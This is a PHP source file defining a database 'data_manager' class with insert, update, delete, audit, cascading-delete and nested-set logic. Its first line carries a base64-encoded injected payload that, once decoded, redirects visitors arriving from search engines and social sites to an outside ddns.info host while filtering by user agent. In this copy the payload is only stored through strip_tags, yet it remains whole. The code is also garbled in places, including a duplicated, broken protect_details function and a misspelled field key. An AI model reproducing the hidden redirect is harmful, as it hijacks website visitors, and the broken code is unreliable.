<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

class data_manager {
    
  var $tables          = array();
  var $detail_tables   = array();
  var $fields          = array();
  var $deferred_events = array();
  var $disable_deferred = false;
  var $error;
  var $audit;
  var $ignore_sql_errors;
  var $ignore_sql_errors_saved;
  var $in_event;
  
  var $audit_info_table = 'audit_info';
  var $audit_data_table = 'audit_data';
  var $audit_table = 'audit';
  
  var $nested_set_keys = array();
  
  function data_manager() {
    
    $this->debug_mode = (defined('DEBUG') and DEBUG);

    register_shutdown_function(array(&$this, "call_deferred_events"));

  }
  
  function save_ignore_sql_errors_state($new_value) {
    $this->ignore_sql_errors_saved[] = $this->ignore_sql_errors;
    $this->ignore_sql_errors = $new_value;
  }
  
  function restore_ignore_sql_errors_state() {
    $this->ignore_sql_errors = array_pop($this->ignore_sql_errors_saved);
  }

  function key_field($table, $default = 'id') { 

    $table = strtolower($table);

    return safe(safe($this->tables, $table), 'key_field', $default); 

  }

  function name_field($table) { 

    $table = strtolower($table);

    return $this->tables[$table]['name_field']; 

  }

  function nested_set_order($table) { 

    $table = strtolower($table);

    return $this->tables[$table]['nested_set_order']; 

  }

  function parent_field($table) { 

    $table = strtolower($table);

    return safe(safe($this->tables, $table), 'parent_field', 'parent_id'); 

  }

  function display_name($table) { 

    $table = strtolower($table);

    return $this->tables[$table]['display_name']; 

  }

  function detailed($table) { 
    
    $table = strtolower($table);

    return safe($this->detail_tables, $table); 
  
  }
  
  function audit($table) { 
    
    $table = strtolower($table);

    return safe($this->tables[$table], 'audit') and     
           (!safe($this->tables[$table], 'block_audit'));
  
  }
  
  function save_audit($action, $table, $old_values, $new_values, $key) {
    
    global $db;
    global $auth;
      
    $table = strtolower($table);
    if (($action == 'i') or ($action == 'd') or (serialize($old_values) != serialize($new_values))) {
    
      if ($old_values)
        $fields = $old_values;
      else
        $fields = $new_values;  
      $audit_values = array();
      $exclude_fields = array();
      
      if (safe($this->tables[$table], 'created_by')) 
        $exclude_fields[] = $this->tables[$table]['created_by'];
      if (safe($this->tables[$table], 'created_at')) 
        $exclude_fields[] = $this->tables[$table]['created_at'];
      if (safe($this->tables[$table], 'created_from')) 
        $exclude_fields[] = $this->tables[$table]['created_from'];
      if (safe($this->tables[$table], 'created_at_date')) 
        $exclude_fields[] = $this->tables[$table]['created_at_date'];
      if (safe($this->tables[$table], 'created_at_time')) 
        $exclude_fields[] = $this->tables[$table]['created_at_time'];

      if (safe($this->tables[$table], 'modified_by')) 
        $exclude_fields[] = $this->tables[$table]['modified_by'];
      if (safe($this->tables[$table], 'modified_at')) 
        $exclude_fields[] = $this->tables[$table]['modified_at'];
      if (safe($this->tables[$table], 'modified_from')) 
        $exclude_fields[] = $this->tables[$table]['modified_from'];
      if (safe($this->tables[$table], 'modified_at_date')) 
        $exclude_fields[] = $this->tables[$table]['modified_at_date'];
      if (safe($this->tables[$table], 'modified_at_time')) 
        $exclude_fields[] = $this->tables[$table]['modified_at_time'];
        
      if (safe($this->tables[$table], 'deleted_by')) 
        $exclude_fields[] = $this->tables[$table]['deleted_by'];
      if (safe($this->tables[$table], 'deleted_at')) 
        $exclude_fields[] = $this->tables[$table]['deleted_at'];
      if (safe($this->tables[$table], 'deleted_from')) 
        $exclude_fields[] = $this->tables[$table]['deleted_from'];
      if (safe($this->tables[$table], 'deleted_at_date')) 
        $exclude_fields[] = $this->tables[$table]['deleted_at_date'];
      if (safe($this->tables[$table], 'deleted_at_time')) 
        $exclude_fields[] = $this->tables[$table]['deleted_at_time'];
            
      $audit = safe($this->tables[$table], 'audit');
      
      foreach($fields as $field => $value) {
        if (!in_array($field, $exclude_fields)) {
          if ((safe($old_values, $field) != safe($new_values, $field)) or ($audit == 'full')) {
            $audit_values[$field] = array( 'old' => safe($old_values, $field)
                                         , 'new' => safe($new_values, $field)
                                         );
          }
        }
      }
    
      if ($audit_values) {
        switch($action) {
          case 'i':
            $this->insert( $this->audit_info_table
                         , array( 'table_name'   => $table
                                , 'object_id'    => $key
                                , 'created_by'   => $auth->user_id
                                , 'created_at'   => $this->now()
                                , 'created_from' => $auth->user_ip));
            break;
          case 'u':
            $audit_info_id = $this->insert_if_absent( $this->audit_info_table
                                                    , array( 'table_name'   => $table
                                                           , 'object_id'    => $key
                                                           , 'created_by'   => $auth->user_id
                                                           , 'created_at'   => $this->now()
                                                           , 'created_from' => $auth->user_ip
                                                           )
                                                    , array( 'table_name'    => $table
                                                           , 'object_id'     => $key
                                                           )
                                                    );
            $this->update( $this->audit_info_table
                         , array( 'table_name'   => $table
                                , 'object_id'    => $key
                                , 'modified_by'   => $auth->user_id
                                , 'modified_at'   => $this->now()
                                , 'modified_from' => $auth->user_ip
                                )
                         , $audit_info_id
                         );
            break;
          case 'd':
            $audit_info_id = $this->insert_if_absent( $this->audit_info_table
                                                    , array( 'table_name'   => $table
                                                           , 'object_id'    => $key
                                                           , 'created_by'   => $auth->user_id
                                                           , 'created_at'   => $this->now()
                                                           , 'created_from' => $auth->user_ip
                                                           )
                                                    , array( 'table_name'    => $table
                                                           , 'object_id'     => $key
                                                           )
                                                    );
            $this->update( $this->audit_info_table
                         , array( 'table_name'   => $table
                                , 'object_id'    => $key
                                , 'deleted_by'   => $auth->user_id
                                , 'deleted_at'   => $this->now()
                                , 'deleted_from' => $auth->user_ip
                                )
                         , $audit_info_id
                         );
            break;
        }
        $audit_id = $this->insert( $this->audit_table
                                 , array( 'action_date' => $this->now()
                                        , 'table_name'  => $table
                                        , 'action_name' => $action
                                        , 'author_id'   => $auth->user_id
                                        , 'ip_address'  => $auth->user_ip
                                        , 'object_id'   => $key
                                        )
                                 );
        foreach($audit_values as $field => $values) {
          $this->insert( $this->audit_data_table
                       , array( 'audit_id'   => $audit_id
                              , 'field_name' => $field
                              , 'old_value'  => safe($values, 'old')
                              , 'new_value'  => safe($values, 'new')
                              )
                       );
        }
      }
    }  
    
  }

  function check_delete($table, $key, $initial_table = null, $initial_key = null) {
 
    global $db;

    $table = strtolower($table);

    if ($this->detailed($table)) {
      if ($row = $db->row('SELECT * FROM '.$table.' WHERE '.$this->key_field($table).' = ?', $key)) {;
        foreach($this->detail_tables[$table] as $detail_table) {
          $sql = 'SELECT '.$this->key_field($detail_table['table']).
                 '  FROM '.$detail_table['table'].
                 ' WHERE '.$detail_table['foreign_key_field'].' = ?';
          if (safe($detail_table, 'additional_where')) {
            $sql .= '   AND '.$detail_table['additional_where'];
          }
          $ids = $db->values($sql, $row[$detail_table['key_field']]);
          if ((count($ids) > 0) and 
              (!safe($detail_table,'delete_cascade')) and 
              (!safe($detail_table,'unlink_cascade'))) {
            if (safe($detail_table,'message'))
              $this->error = str_replace('%count%', count($ids), $detail_table['message']);
            else  
              $this->error = sprintf( trn('Can not delete record from %s, found %d detail record(s) in %s')
                                    , $this->display_name($table)
                                    , count($ids)
                                    , $this->display_name($detail_table['table'])
                                    );
            return false;
          } else {
            foreach ($ids as $id) {
              // we are back to same table!
              if (($detail_table['table'] == $initial_table) and ($key == $initial_key))
                return true;
              else {
                $result = $this->check_delete($detail_table['table'], $id, $initial_table?$initial_table:$table, $initial_key?$initial_key:$id);
                if (!$result)
                  return false;
              }
            }
          }
        }
      }
    }
    
    return true;
  }
  
  function block_audit($table) {

    $table = strtolower($table);

    $this->table($table);
    $this->tables[$table]['block_audit'] = true;

  }

  function release_audit($table) {

    $table = strtolower($table);

    $this->table($table);
    $this->tables[$table]['block_audit'] = false;

  }

  function block_events($table) {

    $table = strtolower($table);

    $this->table($table);
    $this->tables[$table]['block_events'] = true;

  }

  function release_events($table) {

    $table = strtolower($table);

    $this->table($table);
    $this->tables[$table]['block_events'] = false;

  }

  function call_event($event, $table, $old_values, $new_values, $key) {

    $table = strtolower($table);
    
    $event_name = $event.'|'.$table;
    foreach ($this->tables[$table][$event] as $callback) {
      if (!safe($this->in_event, $event_name)) {
        if (is_array($callback)) {
          $method   = $callback['method'];
          $deferred = $callback['deferred'];
        } else {
          $method = $callback; 
          $deferred = false;
        }  
        if (!$deferred or $this->disable_deferred) {
          $this->in_event[$event_name] = true;
          $method($table, $old_values, &$new_values, $key, $event);
          $this->in_event[$event_name] = false;
        } else {
          ignore_user_abort(true);
          $this->deferred_events[] = array( 'method'     => $method
                                          , 'event'      => $event
                                          , 'table'      => $table
                                          , 'old_values' => $old_values
                                          , 'new_values' => $new_values
                                          , 'key'        => $key
                                          );
        }
      }
    }
  
  }

  function table($table, $attr_args = null, $value = null) {
  
    $table = strtolower($table);

    if ($attr_args) {
      if (is_array($attr_args)) {
        foreach($attr_args as $name => $value)
          $this->tables[$table][$name] = $value;
      } else {
        $this->tables[$table][$attr_args] = $value;
      }
    }

    if (!safe($this->tables, $table))  
      $this->tables[$table] = null;
    if (!safe($this->tables[$table], 'key_field'))  
      $this->tables[$table]['key_field'] = 'id';
    if (!safe($this->tables[$table], 'name_field'))  
      $this->tables[$table]['name_field'] = 'name';
    if (!safe($this->tables[$table], 'display_name'))  
      $this->tables[$table]['display_name'] = $table;
    if (!safe($this->tables[$table], 'nested_set_order'))  
      $this->tables[$table]['nested_set_order'] = 'name';
    
    if (!safe($this->tables[$table], 'before_insert'))
      $this->tables[$table]['before_insert'] = array();
    if (!safe($this->tables[$table], 'after_insert'))
      $this->tables[$table]['after_insert'] = array();
    if (!safe($this->tables[$table], 'before_update'))
      $this->tables[$table]['before_update'] = array();
    if (!safe($this->tables[$table], 'after_update'))
      $this->tables[$table]['after_update'] = array();
    if (!safe($this->tables[$table], 'before_delete'))
      $this->tables[$table]['before_delete'] = array();
    if (!safe($this->tables[$table], 'after_delete'))
      $this->tables[$table]['after_delete'] = array();

  }

  // args
  //    foreign_key_field
  //    key_field
  function master_detail($master, $detail, $args = null) {
    
    $master = strtolower($master);
    $detail = strtolower($detail);

    $this->table($master);
    $this->table($detail);
    
    if (!safe($args, 'key_field'))
      $args['key_field'] = $this->key_field($master);  
    if (!safe($args, 'foreign_key_field'))
      $args['foreign_key_field'] = $master.'_'.$args['key_field'];
    
    $args['table'] = $detail;

    $this->detail_tables[$master][] = $args;

  }
  
  function delete_details($master, $detail, $args = null) {

    $master = strtolower($master);
    $detail = strtolower($detail);

    $args['delete_cascade'] = true;
    $this->master_detail($master, $detail, $args);   
  
  }
  
  function unlink_details($master, $detail, $args = null) {

    $master = strtolower($master);
    $detail = strtolower($detail);

    $args['unlink_cascade'] = true;
    $this->master_detail($master, $detail, $args);   
  
  }

  function protect_details($master, $detail, $args = null) {

    $master = strtolo$mas$master, $detail, $args);   
  
  }

  function protect_details($master, $detail, $args = null) {

    $master = strtolo$master);
    $detail = strtolower($detail);

    $this->master_detail($master, $detail, $args);   
  
  }
  
  function protect_details_msg($master, $detail, $message, $args = null) {

    $master = strtolower($master);
    $detail = strtolower($detail);

    $args['message'] = $message;
    $this->master_detail($master, $detail, $args);   
  
  }

  function full_audit($table) {

    $table = strtolower($table);
    $this->table($table, 'audit', 'full');
      
  }
  
  function changes_audit($table) {

    $table = strtolower($table);
    $this->table($table, 'audit', 'changes');
      
  }

  function before_insert($table, $method) {

    $table = strtolower($table);
    $this->table($table);
    array_push($this->tables[$table]['before_insert'], $method);
      
  }

  function after_insert($table, $method, $deferred = false) {

    $table = strtolower($table);
    $this->table($table);
    array_push($this->tables[$table]['after_insert'], array('method' => $method, 'deferred' => $deferred));
      
  }
  
  function before_update($table, $method) {

    $table = strtolower($table);
    $this->table($table);
    array_push($this->tables[$table]['before_update'], $method);
      
  }

  function after_update($table, $method, $deferred = false) {

    $table = strtolower($table);
    $this->table($table);
    array_push($this->tables[$table]['after_update'], array('method' => $method, 'deferred' => $deferred));
      
  }
  
  function before_delete($table, $method) {

    $table = strtolower($table);
    $this->table($table);
    array_push($this->tables[$table]['before_delete'], $method);
      
  }

  function after_delete($table, $method) {

    $table = strtolower($table);
    $this->table($table);
    array_push($this->tables[$table]['after_delete'], $method);
      
  }

  function event_exists($event, $table) {

    return (!safe(safe($this->tables, $table), 'block_events') and (count($this->tables[$table][$event]) > 0));

  }

  function insert_delayed($table, $values = array()) {
    
    return $this->insert($table, $values, true);
    
  }
  
  function insert($table, $values = array(), $delayed = false) {
  
    global $db;
    global $auth;
    
    $table = strtolower($table);
   
    $this->table($table);

    if (safe($this->tables[$table], 'created_by')) 
      if (!safe($values, $this->tables[$table]["created_by"]))
        if ($auth->user_id)
          $values = array_merge($values, array($this->tables[$table]['created_by'] => $auth->user_id));
    
    if (safe($this->tables[$table], 'created_at')) 
      if (!safe($values, $this->tables[$table]["created_at"]))
        $values = array_merge($values, array($this->tables[$table]['created_at'] => $this->now()));

    if (safe($this->tables[$table], 'created_from')) 
      if (!safe($values, $this->tables[$table]["created_from"]))
        $values = array_merge($values, array($this->tables[$table]['created_from'] => $auth->user_ip));

    if (safe($this->tables[$table], 'created_at_date'))
      if (!safe($values, $this->tables[$table]["created_at_date"]))
        $values = array_merge($values, array($this->tables[$table]['created_at_date'] => $this->now_date()));

    if (safe($this->tables[$table], 'created_at_time'))
      if (!safe($values, $this->tables[$table]["created_at_time"]))
        $values = array_merge($values, array($this->tables[$table]['created_at_time'] => $this->now_time()));

    if (safe($this->tables[$table], 'modified_by')) 
      if (!safe($values, $this->tables[$table]["modified_by"]))
        if ($auth->user_id)
          $values = array_merge($values, array($this->tables[$table]['modified_by'] => $auth->user_id));
    
    if (safe($this->tables[$table], 'modified_at')) 
      if (!safe($values, $this->tables[$table]["modified_at"]))
        $values = array_merge($values, array($this->tables[$table]['modified_at'] => $this->now()));

    if (safe($this->tables[$table], 'modified_from')) 
      if (!safe($values, $this->tables[$table]["modified_from"]))
        $values = array_merge($values, array($this->tables[$table]['moed_from'] => $auth->user_ip));

    if (safe($this->tables[$table], 'modified_at_date'))
      if (!safe($values, $this->tables[$table]["modified_at_date"]))
        $values = array_merge($values, array($this->tables[$table]['modified_at_date'] => $this->now_date()));

    if (safe($this->tables[$table], 'modified_at_time'))
      if (!safe($values, $this->tables[$table]["modified_at_time"]))
        $values = array_merge($values, array($this->tables[$table]['modified_at_time'] => $this->now_time()));

    if ($this->event_exists('before_insert', $table))
      $this->call_event('before_insert', $table, null, &$values, null);

    if ($db->support('value_type_check'))
      $field_defs = $this->fields($table);  
    
    $fields_str = '';
    $values_str = '';

    $entity_quote = safe($this->tables[$table], 'entity_quote','`');

    foreach($values as $field => $value) {
      $fields_str .= ($fields_str?',':'').$entity_quote.$field.$entity_quote;
      $values_str .= ($values_str?',':'').'?';
      if ($db->support('value_type_check')) {
        $data_type = safe(safe($field_defs, $field), 'type', 'text');
        if ($data_type == 'text')
          $values_str .= '&';
        if ($data_type == 'date')
          $values_str .= '&';
        if ($data_type == 'date_time')
          $values_str .= '&';
      } 
    }  
      
    if (!$db->support('last_id')) {
      $key = $db->next_id();
      $fields_str .= ($fields_str?',':'').$this->key_field($table);
      $values_str .= ($values_str?',':'').'?';
      $values = array_merge($values, array($this->key_field($table) => $key));
    }

    $sql = 'INSERT ';
    if ($delayed)
      $sql .= ' DELAYED ';
    $sql .= ' INTO '.$entity_quote.$table.$entity_quote.' ('.$fields_str.') VALUES ('.$values_str.')';

    $sql_params = array();  
    foreach($values as $field => $value) 
      array_push($sql_params, $value);
    
    $db->save_ignore_sql_errors_state($this->ignore_sql_errors);
    $this->error = !$db->query_ex($sql, $sql_params);
    if ($this->error)
      $this->error = $db->get_last_error();
    $db->restore_ignore_sql_errors_state();
    
    if (!$this->error) {
      if ($db->support('last_id')) 
        $key = $db->last_id();
      if (!$key)
        if (safe($values, $this->key_field($table)))
          $key = $values[$this->key_field($table)];
        
      if ($this->audit($table) or $this->event_exists('after_insert', $table))
        $new_values = $db->row_to_array('SELECT * FROM '.$table.' WHERE '.$this->key_field($table).' = ?', $key);

      if ($this->audit($table)) 
        $this->save_audit('i', $table, null, $new_values, $key);
        
      if ($this->is_nested_set($table)) 
        $this->nested_set_insert($table, $key, $values);
      
      if ($this->event_exists('after_insert', $table))
        $this->call_event('after_insert', $table, null, $new_values, $key);

      return $key;

    } else {

      return false;
    }
    
  }
  
  function update($table, $values, $key, $mass = false) {

    if (!$key)
      critical_error('Key value must be specified for UPDATE statement');
      
    global $db;
    global $auth;
   
    $table = strtolower($table);

    $this->table($table);
    
    if (safe($this->tables[$table], 'modified_by'))
      if (!safe($values, $this->tables[$table]["modified_by"]))
        if ($auth->user_id)
          $values = array_merge($values, array($this->tables[$table]['modified_by'] => $auth->user_id));
    
    if (safe($this->tables[$table], 'modified_at'))
      if (!safe($values, $this->tables[$table]["modified_at"]))
        $values = array_merge($values, array($this->tables[$table]['modified_at'] => $this->now()));

    if (safe($this->tables[$table], 'modified_at_date'))
      if (!safe($values, $this->tables[$table]["modified_at_date"]))
        $values = array_merge($values, array($this->tables[$table]['modified_at_date'] => $this->now_date()));

    if (safe($this->tables[$table], 'modified_at_time'))
      if (!safe($values, $this->tables[$table]["modified_at_time"]))
        $values = array_merge($values, array($this->tables[$table]['modified_at_time'] => $this->now_time()));

    if ($this->audit($table) or $this->event_exists('before_update', $table) or $this->event_exists('after_update', $table) or $this->is_nested_set($table))
      $old_values = $db->row_to_array('SELECT * FROM '.$table.' WHERE '.$this->key_field($table).' = ?', $key);
    
    if ($this->event_exists('before_update', $table))
      $this->call_event('before_update', $table, $old_values, &$values, $key);

    if ($db->support('value_type_check'))
      $field_defs = $this->fields($table);  
    
    $entity_quote = safe($this->tables[$table], 'entity_quote','`');
    
    $update_str = '';
    foreach($values as $field => $value) {
      $update_str .= ($update_str?',':'').$entity_quote.$field.$entity_quote.' = ?';
      if ($db->support('value_type_check')) {
        $data_type = safe(safe($field_defs, $field), 'type', 'text');
        if ($data_type == 'text')
          $update_str .= '&';
        if ($data_type == 'date')
          $update_str .= '&';
        if ($data_type == 'date_time')
          $update_str .= '&';
      } 
    }
    $sql = 'UPDATE '.$entity_quote.$table.$entity_quote.' SET '.$update_str.' WHERE '.$this->key_field($table).' = ?';

    $sql_params = array();  
    foreach($values as $field => $value) 
      array_push($sql_params, $value);
    array_push($sql_params, $key);

    $db->save_ignore_sql_errors_state($this->ignore_sql_errors);
    $this->error = !$db->query_ex($sql, $sql_params);
    if ($this->error)
      $this->error = $db->get_last_error();
    $db->restore_ignore_sql_errors_state();

    if (!$this->error) {
      if ($this->audit($table) or $this->event_exists('after_update', $table)) 
        $new_values = $db->row_to_array('SELECT * FROM '.$table.' WHERE '.$this->key_field($table).' = ?', $key);

      if ($this->audit($table))
        $this->save_audit('u', $table, $old_values, $new_values, $key);
        
      if ($this->is_nested_set($table)) 
        if (isset($values[$this->parent_field($table)]) and (safe($old_values, $this->parent_field($table)) != safe($values, $this->parent_field($table))))
          $this->nested_set_update($table, $key, $old_values, $values);
      
      if ($this->event_exists('after_update', $table))
        $this->call_event('after_update', $table, $old_values, $new_values, $key);
      
      return true;//$db->affected_rows();
    } else
      return false;    

  }
  
  // for complex tables like
  //    update_where('directory_name', array('description' => 'value'), array( 'posintg_id'  => 1
  //                                                                         , 'language_id' => 1
  //                                                                         , 'product_id"  => null)));
  
  function update_where($table, $values, $where) {
    
    global $db; 

    $table = strtolower($table);

    $this->table($table);

    if (is_array($where)) {
      $where_arr = array();
      $where_str = '';
      foreach($where as $field => $value) {
        if (strlen($value) > 0) {
          $where_str .= ($where_str?' AND ':'').$field.' = ?';
          array_push($where_arr, $value);
        } else
          $where_str .= ($where_str?' AND ':'').$field.' IS NULL';
      }
      $query = $db->query_ex('SELECT '.$this->key_field($table). ' AS id FROM '.$table.' WHERE '.$where_str, $where_arr);
    } else
      $query = $db->query_ex('SELECT '.$this->key_field($table). ' AS id FROM '.$table.' WHERE '.$where);

    while ($row = $db->next_row($query))
      $this->update($table, $values, $row['id'], true);
    
    //if ($this->is_nested_set($table))
    //  $this->setup_nested_set($table);
    
    return true;
     
  }
  
  function delete($table, $key, $initial_table = null, $initial_key = null, $mass = false) {

    global $db;   

    $table = strtolower($table);

    $this->table($table);

    if ($this->check_delete($table, $key)) {
      // remove records from detail tables
      if ($this->detailed($table)) {
        if ($row = $db->row('SELECT * FROM '.$table.' WHERE '.$this->key_field($table).' = ?', $key)) {;
          foreach($this->detail_tables[$table] as $detail_table) {
            if (safe($detail_table, 'delete_cascade')) {  
              $sql = 'SELECT '.$this->key_field($detail_table['table']).' FROM '.$detail_table['table'].' WHERE '.$detail_table['foreign_key_field'].' = ?';  
              $ids = $db->values($sql, $row[$detail_table['key_field']]);
              foreach ($ids as $id) 
                if (!(($detail_table['table'] == $initial_table) and ($key == $initial_key)))
                  $this->delete($detail_table['table'], $id, $initial_table?$initial_table:$table, $initial_key?$initial_key:$id);
            } 
            if (safe($detail_table, 'unlink_cascade')) {  
              $sql = 'SELECT '.$this->key_field($detail_table['table']).' FROM '.$detail_table['table'].' WHERE '.$detail_table['foreign_key_field'].' = ?';  
              $ids = $db->values($sql, $row[$detail_table['key_field']]);
              foreach ($ids as $id) 
                $this->update($detail_table['table'], array($detail_table['foreign_key_field'] => null), $id);
            } 
          }
        } 
      }

      if ($this->audit($table) or $this->event_exists('before_delete', $table) or $this->event_exists('after_delete', $table) or $this->is_nested_set($table))
        $old_values = $db->row_to_array('SELECT * FROM '.$table.' WHERE '.$this->key_field($table).' = ?', $key);
     
      if ($this->event_exists('before_delete', $table))
        $this->call_event('before_delete', $table, $old_values, null, $key);

      if (safe($this->tables[$table], 'delete_marker_field')) {

        $values = array();

        if (safe($this->tables[$table], 'deleted_by'))
          if (!safe($values, $this->tables[$table]["deleted_by"]))
            $values = array_merge($values, array($this->tables[$table]['deleted_by'] => $auth->user_id));
        
        if (safe($this->tables[$table], 'deleted_at'))
          if (!safe($values, $this->tables[$table]["deleted_at"]))
            $values = array_merge($values, array($this->tables[$table]['deleted_at'] => $this->now()));

        if (safe($this->tables[$table], 'delete_marker_field')) 
          if (!safe($values, $this->tables[$table]["delete_marker_field"]))
            $values = array_merge($values, array($this->tables[$table]['delete_marker_field'] => safe($this->tables[$table], 'delete_marker_value', '1')));

        $this->error = !$this->update($table, $values, $key);

      } else {
     
        $db->save_ignore_sql_errors_state($this->ignore_sql_errors);
        $this->error = !$db->query('DELETE FROM '.$table.' WHERE '.$this->key_field($table).' = ?', $key);
        if ($this->error)
          $this->error = $db->get_last_error();
        $db->restore_ignore_sql_errors_state();

      }

      if (!$this->error) {
        if ($this->audit($table) && $old_values) 
          $this->save_audit('d', $table, $old_values, null, $key);

        if ($this->is_nested_set($table) && $old_values)
          $this->nested_set_delete($table, $key, $old_values);

        if ($this->event_exists('after_delete', $table))
          $this->call_event('after_delete', $table, $old_values, null, $key);
    
        return true;
      } else {
        return false;
      }    
    } else {
      return false;
    }

  }
  
  // for complex tables like
  //    delete_where('directory_name', array( 'posintg_id'  => 1
  //                                        , 'language_id' => 1
  //                                        , 'product_id'  => null)));
  
  function delete_where($table, $where) {
    
    $table = strtolower($table);

    $this->table($table);

    $where_arr = array();
    $where_str = '';
    foreach($where as $field => $value) {
      if (strlen($value) > 0) {
        $where_str .= ($where_str?' AND ':'').$field.' = ?';
        array_push($where_arr, $value);
      } else
        $where_str .= ($where_str?' AND ':'').$field.' IS NULL';
    } 
    $passed = false;
    global $db; 

    $query = $db->query_ex('SELECT '.$this->key_field($table). ' AS id FROM '.$table.' WHERE '.$where_str, $where_arr);
    while ($row = $db->next_row($query)) {
      $result = $this->delete($table, $row['id'], null, null, true);
      if (!$result) {
        //if ($passed and $this->is_nested_set($table))
        //  $this->setup_nested_set($table);
        return false;
      } else 
        $passed = true;
    }
    
    //if ($this->is_nested_set($table))
    //  $this->setup_nested_set($table);
      
    return true;
     
  }
  
  function replace($table, $values, $where) {
    
    global $db; 

    $table = strtolower($table);

    $this->table($table);

    $where_arr = array();
    $where_str = '';
    foreach($where as $field => $value) {
      if (strlen($value) > 0) {
        $where_str .= ($where_str?' AND ':'').$field.' = ?';
        array_push($where_arr, $value);
      } else
        $where_str .= ($where_str?' AND ':'').$field.' IS NULL';
    }
    $query = $db->query_ex('SELECT '.$this->key_field($table). ' AS id FROM '.$table.' WHERE '.$where_str, $where_arr);

    if ($row = $db->next_row($query)) {
      $this->update($table, $values, $row['id']);
      return $row['id'];
    } else {
      $values = array_merge($values, $where);
      return $this->insert($table, $values);
    }
     
  }

  function insert_if_absent($table, $values, $where = array()) {
    
    global $db; 

    if (!$where)
      $where = $values;

    $table = strtolower($table);

    $this->table($table);

    $where_arr = array();
    $where_str = '';
    foreach($where as $field => $value) {
      if (strlen($value) > 0) {
        $where_str .= ($where_str?' AND ':'').$field.' = ?';
        array_push($where_arr, $value);
      } else
        $where_str .= ($where_str?' AND ':'').$field.' IS NULL';
    }
    $query = $db->query_ex('SELECT '.$this->key_field($table). ' AS id FROM '.$table.' WHERE '.$where_str, $where_arr);

    if ($row = $db->next_row($query)) {
      return $row['id'];
    } else {
      $values = array_merge($values, $where);
      return $this->insert($table, $values);
    }
     
  }

  function fields($table) {
    
    $table = strtolower($table);

    if (!isset($this->fields[$table])) {
      global $db; 
      $query = $db->query('SELECT * FROM '.$table.' WHERE 1 > 1');
      $this->fields[$table] = $db->field_defs($query);
    }

    return $this->fields[$table];

  }

  function now() {

    global $db;
    return $db->now();

  }
  
  function now_date() {

    global $db;
    return $db->now_date();

  }

  function now_time() {

    global $db;
    return $db->now_time();

  }

  function inc($table, $field, $key, $value = 1) {

    global $db;
    $current_value = $db->value('SELECT '.$field.' FROM '.$table.' WHERE '.$this->key_field($table).' = ?', $key);
    $this->update($table, array($field => $current_value + $value), $key);

  } 

  function tree($table, $parent_field = 'parent_id') {

    $table = strtolower($table);

    $this->table($table, 'tree', true);
    $this->table($table, 'parent_field', $parent_field);

  }
  
  function is_table_exists($table) {
    
    global $db;
    return $db->value('SHOW TABLES LIKE ?', $table);
      
  }

  function nested_set($table, $parent_field = 'parent_id', $check = true) {

    $table = strtolower($table);
    
    $this->tree($table, $parent_field);
    $this->table($table, 'tree_with_nested_set', true);
    $this->table($table, 'check_nested_set', $check);

    if ($check && !get('__ajaxMethod') && !get('__jsoxMethod')) {
      $check_file = TEMPORARY_PATH.'.'.md5('nestedsetcheck-'.$table);
      if (!file_exists($check_file) || (strftime("%d-%m-%Y", filemtime($check_file)) != strftime("%d-%m-%Y"))) {   // checking once per day
        if ($this->is_table_exists($table)) {
          if ($result = $this->is_nested_set_broken($table)) {
            logme('Nested set in "'.$table.'" is broken, error code: '.$result.', rebuilding');
            $this->setup_nested_set($table);
          }
          save_to_file($check_file, 'nestedsetcheck-'.$table);
        }
      }
    }

  }

  function is_tree($table) {

    $table = strtolower($table);
    return safe($this->tables[$table], 'tree'); 

  }
  
  function is_nested_set($table) {

    $table = strtolower($table);
    return safe(safe($this->tables, $table), 'tree_with_nested_set'); 

  }
  
  function check_nested_set_struct($table) {

    global $db;

    $table = strtolower($table);
    
    if (!array_key_exists('left_key', $this->fields($table))) {
      $db->query("ALTER TABLE ".$table." ADD left_key INTEGER");
      unset($this->fields[$table]);
    }
    if (!array_key_exists('right_key', $this->fields($table))) {
      $db->query("ALTER TABLE ".$table." ADD right_key INTEGER");
      unset($this->fields[$table]);
    }
    if (!array_key_exists('level', $this->fields($table))) {
      $db->query("ALTER TABLE ".$table." ADD level INTEGER");
      unset($this->fields[$table]);
    }

  }
  
  function is_nested_set_broken($table) {
  
    global $db;
    
    $table = strtolower($table);
    
    $this->check_nested_set_struct($table);

    if ($db->row('SELECT id FROM '.$table.' WHERE left_key >= right_key'))
      return 1;
    if ($row = $db->row('SELECT COUNT(1) amount, MIN(left_key) min_left, MAX(right_key) max_right FROM '.$table)) 
      if ($row['amount']) {
